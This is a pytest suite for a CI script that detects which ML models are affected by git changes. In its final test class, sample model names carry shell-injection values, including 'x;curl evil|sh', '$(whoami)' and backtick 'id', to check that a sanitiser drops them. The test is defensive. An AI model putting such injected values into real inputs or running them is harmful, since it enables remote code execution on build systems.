"""Test suite for detect_models.py.

Tests the model detection script that determines which models are affected
by git changes, including both default mode (commons -> all models) and
smart mode (dependency analysis).
"""

import os
import subprocess
import sys
import tempfile
from collections.abc import Callable


def _run_detect_models(*args: str) -> "subprocess.CompletedProcess[str]":
    """Helper to run detect_models.py as a subprocess and return the result."""
    script_path = os.path.join(os.path.dirname(__file__), "detect_models.py")
    env = os.environ.copy()
    env.pop("GITHUB_OUTPUT", None)
    return subprocess.run(
        [sys.executable, script_path, *args],
        capture_output=True,
        text=True,
        env=env,
    )


class TestDefaultMode:
    """Test default detection mode (production behavior)."""

    def test_runs_successfully(self) -> None:
        result = _run_detect_models("HEAD^")
        assert result.returncode == 0

    def test_shows_default_mode_indicator(self) -> None:
        result = _run_detect_models("HEAD^")
        assert (
            "Using default detection" in result.stdout
            or "No changes detected" in result.stdout
        )


class TestSmartMode:
    """Test smart dependency analysis mode."""

    def test_runs_successfully(self) -> None:
        result = _run_detect_models("HEAD^", "--smart")
        assert result.returncode == 0

    def test_shows_smart_mode_indicator(self) -> None:
        result = _run_detect_models("HEAD^", "--smart")
        assert (
            "Smart mode enabled" in result.stdout
            or "smart dependency analysis" in result.stdout
            or "No changes detected" in result.stdout
        )


class TestGitHubOutputHandling:
    """Test GITHUB_OUTPUT environment variable handling."""

    def test_handles_missing_github_output(self) -> None:
        result = _run_detect_models("HEAD^")
        assert "GITHUB_OUTPUT not set" in result.stdout

    def test_writes_to_github_output_file(self) -> None:
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as f:
            output_file = f.name

        try:
            script_path = os.path.join(os.path.dirname(__file__), "detect_models.py")
            env = os.environ.copy()
            env["GITHUB_OUTPUT"] = output_file

            result = subprocess.run(
                [sys.executable, script_path, "HEAD^"],
                capture_output=True,
                text=True,
                env=env,
            )
            assert result.returncode == 0

            with open(output_file) as f:
                content = f.read()
            assert "models_changed=" in content
            assert "has_models=" in content
        finally:
            os.unlink(output_file)


class TestBackwardCompatibility:
    """Test that old command line usage still works."""

    def test_positional_base_ref(self) -> None:
        result = _run_detect_models("HEAD^")
        assert result.returncode == 0
        assert "Found" in result.stdout or "No changes detected" in result.stdout

    def test_deployment_tests_flag(self) -> None:
        result = _run_detect_models("HEAD^", "--deployment-tests")
        assert result.returncode == 0
        assert "Found" in result.stdout or "No changes detected" in result.stdout


class TestModelNameSafety:
    """Detected names become CI matrix legs interpolated into shell — only plain
    slugs may pass; anything else is dropped before emission (defense-in-depth)."""

    def _safe_model_names(self) -> Callable[[list[str]], list[str]]:
        sys.path.insert(0, os.path.dirname(__file__))
        from detect_models import _safe_model_names

        return _safe_model_names

    def test_plain_slugs_pass(self) -> None:
        fn = self._safe_model_names()
        assert fn(["esm2", "protein-mpnn", "esm_if1", "rf3"]) == [
            "esm2",
            "protein-mpnn",
            "esm_if1",
            "rf3",
        ]

    def test_shell_metacharacters_dropped(self) -> None:
        fn = self._safe_model_names()
        unsafe = ["esm2", "x;curl evil|sh", "a$(whoami)", "b`id`", "c d", "../e"]
        assert fn(unsafe) == ["esm2"]
